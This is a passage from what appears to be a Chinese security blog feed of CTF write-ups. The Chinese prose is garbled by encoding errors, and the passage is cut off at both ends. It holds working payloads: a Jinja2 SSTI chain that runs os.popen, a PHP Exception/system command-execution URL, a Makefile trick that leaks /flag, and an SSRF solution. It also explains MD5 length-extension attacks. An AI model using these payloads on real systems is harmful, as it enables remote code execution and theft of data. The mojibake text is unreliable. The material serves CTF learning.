ä¸ºå¤è¯»è¿™ç§ç›´æ¥è¾“å‡ºåˆ°webä¸Šçš„ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨æ¨¡æ¿æ¥å®ç°çš„ã€‚å¯æ˜¯æµ‹è¯•ä¹‹åå‘ç°æ— æ³•ä½¿ç”¨<code>&#123;&#125;</code>è¿™ä¹Ÿå°±å¯¼è‡´å®Œå…¨å¡ä½äº†ã€‚ä½†æ˜¯æˆ‘ä»¬è§‚å¯Ÿé¢˜ç›®è¯´çš„ä»–åªèƒ½å¤è¯»è‹±æ–‡ï¼Œé‚£ä¹ˆè¾“å…¥ä¸­æ–‡ä¼šå‘ç”Ÿä¸Šé¢å‘¢?ã€‚ç»“æœå°±å‘ç°è¾“å…¥ä¸­æ–‡ä¼šä½¿å¾—å¤šå‡ºä¸€ä¸ª<code>&#123;&#125;</code>é‚£ä¹ˆæˆ‘ä»¬è¾“å…¥ä¸¤ä¸ªä¸­æ–‡å­—ç¬¦å³å¯å¾—åˆ°<code>&#123;&#123;&#125;&#125;</code>é‚£ä¹ˆå°±å¯ä»¥è¿›è¡Œsstiäº†ã€‚åœ¨è¿›è¡Œsstiæ—¶å‘ç°è¿‡æ»¤äº†å¾ˆå¤šï¼Œä½†æ˜¯æ²¡å…³ç³»æˆ‘ä»¬ç›´æ¥ä½¿ç”¨è¯·æ±‚æ¥é€ƒé€¸<br>payload<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¾—åˆ°()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(<span class="number">80</span>)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=<span class="built_in">eval</span>&amp;x9=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls /&quot;</span>).read()</span><br></pre></td></tr></table></figure></p><h1 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ä¸€å¼€å§‹ç›´æ¥newæ¥è¿›è¡Œå®ä¾‹ä¸€ä¸ªå¯¹è±¡ã€‚é‚£ä¹ˆæˆ‘ä»¬å¾ˆè‡ªç„¶çš„æƒ³åˆ°ä½¿ç”¨åŸç”Ÿç±»ã€‚æˆ‘ä»¬è§‚å¯Ÿè¿™ä¸ªæ„é€ å¯ä»¥çŸ¥é“éœ€è¦åˆ©ç”¨ä¸¤ä¸ªæ‹¬å·å†…çš„è¿”å›å€¼æ¥æ„é€ å‘½ä»¤ã€‚<br>æˆ‘ä»¬çš„ç›®æ ‡å‘½ä»¤å°±æ˜¯system(â€˜cat /flagâ€™);<br>å³å‰ä¸€ä¸ªè¿”å›å€¼ä¸ºsystemåä¸€ä¸ªä¸ºcat /flag<br>è€Œæ§åˆ¶è¿”å›å€¼è®©æˆ‘æƒ³åˆ°äº†Errorç±»ï¼Œå…¶tostringæ–¹æ³•å°±æ˜¯è¿”å›å‚æ•°å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹å…¶æ˜¯å¦å­˜åœ¨å…¶ä»–çš„æ–¹æ³•<br>æˆ‘ä»¬ç¿»ä¸€ä¸‹phpæ‰‹å†Œä¼šå‘ç°å…¶å­˜åœ¨ç±»å¯ä»¥è¿”å›string<br><br>Exceptionç±»ä¹Ÿä¸€æ ·<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9502/?a=Exception&amp;aa=system&amp;c=getMessage&amp;b=Exception&amp;bb=tac /flag</span><br></pre></td></tr></table></figure></p><h1 id="ÎµZ-Â¿Ğ¼-KÎµÂ¿"><a href="#ÎµZ-Â¿Ğ¼-KÎµÂ¿" class="headerlink" title="ÎµZ?Â¿Ğ¼@KÎµÂ¿?"></a>ÎµZ?Â¿Ğ¼@KÎµÂ¿?</h1><p>è¿™é¢˜æˆ‘ä»¬çœ‹hint.phpå¯ä»¥å‘ç°å…¶åªèƒ½ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦æ¥æ„é€ å‘½ä»¤ã€‚<br>æˆ‘ä»¬çŸ¥é“<code>$()</code>å¯ä»¥è¡¨ç¤ºbashã€‚é‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨<code>$()</code>æ¥å°è¯•è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚è€Œåœ¨Makefileé‡Œ<code>$&lt;</code>è¡¨ç¤ºç¬¬ä¸€ä¸ªä¾èµ–é¡¹ï¼ˆä¸€èˆ¬æ˜¯æ„é€ ç›®æ ‡æ–‡ä»¶ï¼‰<br><br>æˆ‘ä»¬å¯ä»¥å‘ç°ç¬¬ä¸€ä¸ªä¾èµ–æ€§ä¸º/flagå³<code>$&lt;</code>ä¸º/flagã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨é‡å®šå‘ç¬¦&lt;æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>æˆ‘ä»¬æŸ¥çœ‹ä¸‹é¢è¿™ä¸ªå‘½ä»¤<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&lt;file)</span><br></pre></td></tr></table></figure><br>åœ¨bashä¸­è¿™æ˜¯å°†fileçš„å†…å®¹å½“æˆå‘½ä»¤æ‰§è¡Œï¼Œå½“æ— æ³•æ‰§è¡Œæ—¶å°±ä¼šæŠ¥é”™è€ŒæŠ¥é”™çš„å†…å®¹é‡Œå°±å«æœ‰æ–‡ä»¶çš„å†…å®¹ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬åªè¦èƒ½æ„é€ å‡ºæ•ˆæœå’Œ<code>$(&lt;/flag)</code>ç›¸åŒçš„å³å¯å¾—åˆ°flagã€‚<br>è€Œåœ¨makefileä¸‹$$<code>ä»£è¡¨å¼•ç”¨å˜é‡ä½¿ç”¨æˆ‘ä»¬éœ€è¦ä½¿ç”¨</code>$$$æ¥ä»£æ›¿<code>$</code>é‚£ä¹ˆæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸‹é¢çš„å‘½ä»¤<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$(&lt;$&lt;)</span><br></pre></td></tr></table></figure><br>è¿™å°±ä¼šæŠ¥é”™å¹¶å›æ˜¾å‡ºflag</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å“ˆå¸Œæ‰©å±•æ”»å‡»</title>
      <link href="/2024/04/24/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2024/04/24/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆæ˜¯åšxyå­¦åˆ°çš„ã€‚xyçœŸæ˜¯æ¯ä¸€é¢˜éƒ½åœ¨å­¦ä¹ ã€‚"><a href="#åˆæ˜¯åšxyå­¦åˆ°çš„ã€‚xyçœŸæ˜¯æ¯ä¸€é¢˜éƒ½åœ¨å­¦ä¹ ã€‚" class="headerlink" title="åˆæ˜¯åšxyå­¦åˆ°çš„ã€‚xyçœŸæ˜¯æ¯ä¸€é¢˜éƒ½åœ¨å­¦ä¹ ã€‚"></a>åˆæ˜¯åšxyå­¦åˆ°çš„ã€‚xyçœŸæ˜¯æ¯ä¸€é¢˜éƒ½åœ¨å­¦ä¹ ã€‚</h1><h1 id="md5åŠ å¯†"><a href="#md5åŠ å¯†" class="headerlink" title="md5åŠ å¯†"></a>md5åŠ å¯†</h1><p>æˆ‘ä»¬å…ˆèŠèŠmd5åŠ å¯†ã€‚</p><h2 id="åŠ å¯†è¿‡ç¨‹"><a href="#åŠ å¯†è¿‡ç¨‹" class="headerlink" title="åŠ å¯†è¿‡ç¨‹"></a>åŠ å¯†è¿‡ç¨‹</h2><p>æˆ‘ä»¬ä¼šå‘ç°åœ¨md5åŠ å¯†åæ€»æ˜¯ä¼šè¾“å‡ºä¸€ä¸ª128ä½çš„å­—ç¬¦ä¸²ï¼Œä¸ç®¡æ˜¯å¤šå¤§çš„æ•°æ®ï¼Œå› ä¸ºmd5æ˜¯ä¸€ä¸ªæœ‰æŸåŠ å¯†ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†æˆ‘ä»¬è®¤ä¸ºmd5åŠ å¯†ä¸å¯é€†ã€‚ä½†æ˜¯å¯ä»¥ç¢°æ’ã€‚<br>è‡³äºå…¶åŠ å¯†æµç¨‹æˆ‘ç›´æ¥å…ˆè´´ä¸ªå›¾<br><img src="/2024/04/24/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/1.jpg" class="" title="alt text"></p><h3 id="å¡«å……"><a href="#å¡«å……" class="headerlink" title="å¡«å……"></a>å¡«å……</h3><p>åŠ å¯†çš„ç¬¬ä¸€æ­¥å°±æ˜¯å¡«å……ã€‚åœ¨è¿›è¡Œmd5åŠ å¯†æ—¶ç¬¬ä¸€æ­¥å°±æ˜¯å¡«å……ï¼ŒåŠ å¯†æ•°æ®å°äº448ä½çš„æ•°æ®ä¼šå…ˆå…ˆå¡«å……åˆ°448ä½å¡«å……çš„å­—ç¬¦å°±æ˜¯16è¿›åˆ¶çš„\x80\x00\x00\x00\x00ã€‚å¡«å……åˆ°448ä½æœ€åçš„å†å†™å…¥64ä½çš„å†…å®¹ä»£è¡¨åŸæ•°æ®çš„é•¿åº¦ã€‚è¡¥å……åˆ°512ä½ã€‚å¦‚æœæ•°æ®å¤§äº512å°±è¡¥å……é“1024ä½ã€‚å¦‚æœç­‰äº512ä¹Ÿè¦è¡¥å……åˆ°1024</p><h3 id="åˆ†ç»„åŠ å¯†"><a href="#åˆ†ç»„åŠ å¯†" class="headerlink" title="åˆ†ç»„åŠ å¯†"></a>åˆ†ç»„åŠ å¯†</h3><p>md5çš„åŠ å¯†æ˜¯å°†æ•°æ®æŒ‰512ä¸€ç»„åˆ†æˆå¤šç»„ä¸åˆå§‹çš„å¹»æ•°åŠ å¯†<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x67452301</span><br><span class="line">0xEFCDAB89</span><br><span class="line">0x98BADCFE</span><br><span class="line">0x10325476</span><br></pre></td></tr></table></figure><br>åˆå§‹å¹»æ•°ä¸ç¬¬ä¸€ç»„è¿›è¡Œä¸€ç³»åˆ—å¤æ‚çš„è¿ç®—ï¼Œå¾—åˆ°ç¬¬äºŒç»„å¹»æ•°ï¼Œç¬¬äºŒç»„å¹»æ•°å†ä¸ç¬¬è€Œåšçš„æ•°æ®è¿›è¡Œè¿ç®—ï¼Œä»¥æ­¤ç±»æ¨åˆ°æœ€åä¸€ç»„å¾—åˆ°çš„å››ä¸ªæœ€ç»ˆçš„å¹»æ•°è¿›è¡Œä¸‹é¢çš„æ“ä½œå°±æ˜¯å¾—åˆ°çš„md5å€¼<br>å‡è®¾æœ€åå¾—åˆ°çš„4ç»„å¹»æ•°éƒ½æ˜¯0xabcdefgh<br>é‚£ä¹ˆé¦–å…ˆä¸¤ä¸¤åˆ†ç»„<br>å¾—åˆ°<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ab cd ef gh</span><br><span class="line">ab cd ef gh</span><br><span class="line">ab cd ef gh</span><br><span class="line">ab cd ef gh</span><br></pre></td></tr></table></figure><br>å†é€†åºæ‹¼æ¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ghefcdabghefcdabghefcdabghefcdab</span><br></pre></td></tr></table></figure><br>è¿™å°±æ˜¯æœ€ç»ˆçš„md5å€¼</p><h1 id="å“ˆå¸Œæ‰©å±•æ”»å‡»çš„åŸç†"><a href="#å“ˆå¸Œæ‰©å±•æ”»å‡»çš„åŸç†" class="headerlink" title="å“ˆå¸Œæ‰©å±•æ”»å‡»çš„åŸç†"></a>å“ˆå¸Œæ‰©å±•æ”»å‡»çš„åŸç†</h1><p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ä¸‹é¢çš„demo<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$_flag</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span></span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„demoç»™å‡ºäº†flagçš„md5å€¼ä½†æ˜¯æˆ‘ä»¬éƒ½çŸ¥é“md5æ˜¯ä¸å¯é€†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥æ¨å¯¼å‡ºflagã€‚<br>é‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ifè¯­å¥<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$_flag</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥æ§åˆ¶å­—ç¬¦ä¸<code>$_flag</code>è¿›è¡Œæ‹¼æ¥ï¼Œä¹‹åå†ä¸æˆ‘ä»¬è¾“å…¥çš„md5å€¼è¿›è¡Œæ¯”è¾ƒã€‚<br>é‚£ä¹ˆä¸Šé¢å°±å‡ºç°äº†å“ˆå¸Œæ‰©å±•æ¼æ´ã€‚æˆ‘ä»¬éƒ½çŸ¥é“md5å†åŠ å¯†ç›´æ¥å›è¿›è¡Œå¡«å……ï¼Œè€Œå‰ä¸€ç»„çš„åŠ å¯†çš„ç»“æœä¼šè¢«å½“æˆåä¸€ç»„çš„å¹»æ•°è¿›è¡Œå†ä¸€æ¬¡çš„åŠ å¯†ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬å¦‚æœç”¨è¾“å…¥çš„dataæ¥ä½¿å¾—flagè¢«æ­£ç¡®å¡«å……åˆ°512ä½ï¼Œå†åŠ å¯†<code>md5($_flag.$_GET[&#39;data&#39;])</code>æ—¶ç¬¬äºŒç»„çš„å¹»æ•°ä¸å°±æ˜¯ç¬¬ä¸€ç»„åŠ å¯†çš„å€¼å³flagçš„md5ç»è¿‡é€†åºçš„å€¼å—?ï¼Œé‚£ä¹ˆæˆ‘ä»¬çŸ¥é“äº†flagçš„md5å€¼ï¼Œå³çŸ¥é“äº†ç¬¬äºŒç»„çš„å¹»æ•°é‚£ä¹ˆæˆ‘ä»¬è¾“å…¥çš„md5å€¼åªè¦æ˜¯ä»¥ç¬¬äºŒåšçš„å¹»æ•°ä¸ºåˆå§‹å¹»æ•°åŠ å¯†çš„æ•°æ®ä¸å°±å¯ä»¥é€šè¿‡äº†å—?</p><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><p>æˆ‘ä»¬è¦å…ˆçŸ¥é“$flagçš„é•¿åº¦ï¼ˆå› ä¸ºæˆ‘ä»¬å†å¯¹å­—ç¬¦è¿›è¡Œå¡«å……æ—¶æœ€åçš„64ä½è¦ä¸ºï¼‰ï¼Œä¸çŸ¥é“å¯ä»¥å¤šæ¬¡å°è¯•æ¥çˆ†ç ´ã€‚ç„¶åå†è¿›è¡Œå¡«å……å¦‚è¾“å…¥ä»¥ä¸‹å­—æ®µå¡«å……ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8000000000000000000....lalalalala</span><br></pre></td></tr></table></figure><br>è€Œlalalalaå°±æ˜¯ç¬¬äºŒç»„çš„å†…å®¹ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨ç¬¬ä¸€ç»„çš„åŠ å¯†ç»“æœå³æ³„éœ²çš„md5å€¼çš„é€†åºæ¥åŠ å¯†ç¬¬äºŒç»„æ•°æ®ã€‚æœ€ç»ˆæˆ‘ä»¬å¾—åˆ°çš„åŠ å¯†ç»“æœå°±æ˜¯<code>md5($_flag.$_GET[&#39;data&#39;])</code>è¿™ä¸ªç»“æœã€‚</p><h1 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h1><p>ä¸Šé¢çš„æµç¨‹æˆ‘ä»¬æ˜¯ä¸å¯èƒ½æ‰‹æ‰“çš„æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è„šæœ¬è¿›è¡Œæ”»å‡»<br>å¯èƒ½æ˜¯å› ä¸ºç¯å¢ƒåŸå› æˆ‘æ— æ³•ä»GitHubä¸Šæ‹‰å–hashpumpï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œç”¨çš„æ˜¯ä¸‹é¢è¿™ä¸ªè„šæœ¬<br>hash-ext-attack<br>æµç¨‹å°±æ˜¯æŒ‰è„šæœ¬æç¤ºçš„è¾“å…¥ï¼Œæ”»å‡»çš„æ¡ä»¶å°±æ˜¯å·²çŸ¥é•¿åº¦ï¼Œå·²çŸ¥md5å€¼ï¼Œå¹¶ä¸”æ‹¼æ¥è¿›è¡Œæ¯”è¾ƒ</p>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
          <category> å“ˆå¸Œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å“ˆå¸Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸•é²æ¯</title>
      <link href="/2024/04/21/%E5%B8%95%E9%B2%81%E6%9D%AF/"/>
      <url>/2024/04/21/%E5%B8%95%E9%B2%81%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿™ä¸ªå¸•é²æ¯ä¸»è¦è€ƒçš„æ˜¯åº”æ€¥å“åº”ï¼Œæœ¬äººæ˜¯ä¸€ç‚¹ä¸ä¼šï¼Œæ‰€ä»¥å°±å†™äº†å‡ é¢˜web-å†™äº†å‰ä¸‰é¢˜æ„Ÿè§‰éš¾åº¦ä¸æ˜¯ç‰¹åˆ«å¤§-å’Œæœ€ç®€å•çš„å‡ é¢˜åº”æ€¥å“åº”ï¼Œç”±äºå…¶æ˜¯é¶æœºä»£ç†çš„å½¢å¼æå¾—webé¶æœºï¼Œwebé¶æœºä¸€ç›´æ‰ï¼ˆæ‰«åå°è¿˜æ…¢ï¼‰æ‰€ä»¥æˆ‘webæœ€åä¸€é¢˜å°±æ‡’çš„å†™äº†ï¼Œå°±å»ç©åº”æ€¥å“åº”äº†ã€‚"><a href="#è¿™ä¸ªå¸•é²æ¯ä¸»è¦è€ƒçš„æ˜¯åº”æ€¥å“åº”ï¼Œæœ¬äººæ˜¯ä¸€ç‚¹ä¸ä¼šï¼Œæ‰€ä»¥å°±å†™äº†å‡ é¢˜web-å†™äº†å‰ä¸‰é¢˜æ„Ÿè§‰éš¾åº¦ä¸æ˜¯ç‰¹åˆ«å¤§-å’Œæœ€ç®€å•çš„å‡ é¢˜åº”æ€¥å“åº”ï¼Œç”±äºå…¶æ˜¯é¶æœºä»£ç†çš„å½¢å¼æå¾—webé¶æœºï¼Œwebé¶æœºä¸€ç›´æ‰ï¼ˆæ‰«åå°è¿˜æ…¢ï¼‰æ‰€ä»¥æˆ‘webæœ€åä¸€é¢˜å°±æ‡’çš„å†™äº†ï¼Œå°±å»ç©åº”æ€¥å“åº”äº†ã€‚" class="headerlink" title="è¿™ä¸ªå¸•é²æ¯ä¸»è¦è€ƒçš„æ˜¯åº”æ€¥å“åº”ï¼Œæœ¬äººæ˜¯ä¸€ç‚¹ä¸ä¼šï¼Œæ‰€ä»¥å°±å†™äº†å‡ é¢˜web(å†™äº†å‰ä¸‰é¢˜æ„Ÿè§‰éš¾åº¦ä¸æ˜¯ç‰¹åˆ«å¤§)å’Œæœ€ç®€å•çš„å‡ é¢˜åº”æ€¥å“åº”ï¼Œç”±äºå…¶æ˜¯é¶æœºä»£ç†çš„å½¢å¼æå¾—webé¶æœºï¼Œwebé¶æœºä¸€ç›´æ‰ï¼ˆæ‰«åå°è¿˜æ…¢ï¼‰æ‰€ä»¥æˆ‘webæœ€åä¸€é¢˜å°±æ‡’çš„å†™äº†ï¼Œå°±å»ç©åº”æ€¥å“åº”äº†ã€‚"></a>è¿™ä¸ªå¸•é²æ¯ä¸»è¦è€ƒçš„æ˜¯åº”æ€¥å“åº”ï¼Œæœ¬äººæ˜¯ä¸€ç‚¹ä¸ä¼šï¼Œæ‰€ä»¥å°±å†™äº†å‡ é¢˜web(å†™äº†å‰ä¸‰é¢˜æ„Ÿè§‰éš¾åº¦ä¸æ˜¯ç‰¹åˆ«å¤§)å’Œæœ€ç®€å•çš„å‡ é¢˜åº”æ€¥å“åº”ï¼Œç”±äºå…¶æ˜¯é¶æœºä»£ç†çš„å½¢å¼æå¾—webé¶æœºï¼Œwebé¶æœºä¸€ç›´æ‰ï¼ˆæ‰«åå°è¿˜æ…¢ï¼‰æ‰€ä»¥æˆ‘webæœ€åä¸€é¢˜å°±æ‡’çš„å†™äº†ï¼Œå°±å»ç©åº”æ€¥å“åº”äº†ã€‚</h1><h1 id="web-ç­¾åˆ°"><a href="#web-ç­¾åˆ°" class="headerlink" title="web-ç­¾åˆ°"></a>web-ç­¾åˆ°</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag  <span class="comment"># å‡è®¾ä» flag.py æ–‡ä»¶ä¸­å¯¼å…¥äº† flag å‡½æ•°</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url:</span><br><span class="line">        <span class="comment"># è¯·æ±‚url</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        content = response.text</span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;paluctf&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> content</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        response = &#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="number">200</span>,  <span class="comment"># è¿™é‡Œæ˜¯æ•°å€¼ï¼Œä¸æ˜¯å­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: <span class="string">&quot;Come sign in and get the flag!&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jsonify(response)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag1</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;paluctf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç­¾åˆ°é¢˜éš¾åº¦ä¸é«˜ã€‚<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url:</span><br><span class="line">        <span class="comment"># è¯·æ±‚url</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        content = response.text</span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;paluctf&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure></p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åªè¦è®©å…¶è®¿é—®çš„urlå“åº”é‡Œæœ‰paluctfå°±å¯ä»¥äº†ã€‚<br>ä¸€å¼€å§‹æˆ‘æ˜¯æƒ³ssrfæ¥è®¿é—®127.0.0.1çš„80ç«¯å£çš„ä½†æ˜¯ä¸€ç›´æŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘å°±ç›´æ¥å¼€äº†vpsæœåŠ¡è®©å…¶è®¿é—®ï¼Œåæ­£åªè¦æŠ¥æ–‡é‡Œåªè¦æœ‰paluctfå°±è¡Œäº†ã€‚</p><h2 id="å®è·µ"><a href="#å®è·µ" class="headerlink" title="å®è·µ"></a>å®è·µ</h2><p>ç”±äºæœ¬äººè¿˜ä¸ä¼šå†vpsä¸Šæ­ç½‘ç«™ï¼Œä½†æ˜¯é—®é¢˜ä¸å¤§å¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºpaluctfçš„æ–‡ä»¶ï¼Œå†å¼€å¯è®¿é—®ä½¿å…¶å¯ä»¥å†å…¬ç½‘ä¸Šè¢«è®¿é—®è¿™æ ·å“åº”å°±ä¼šæœ‰paluctfäº†<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo aaaa &gt; paluctf</span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><br><img src="/2024/04/21/%E5%B8%95%E9%B2%81%E6%9D%AF/1.png" class="" title="alt 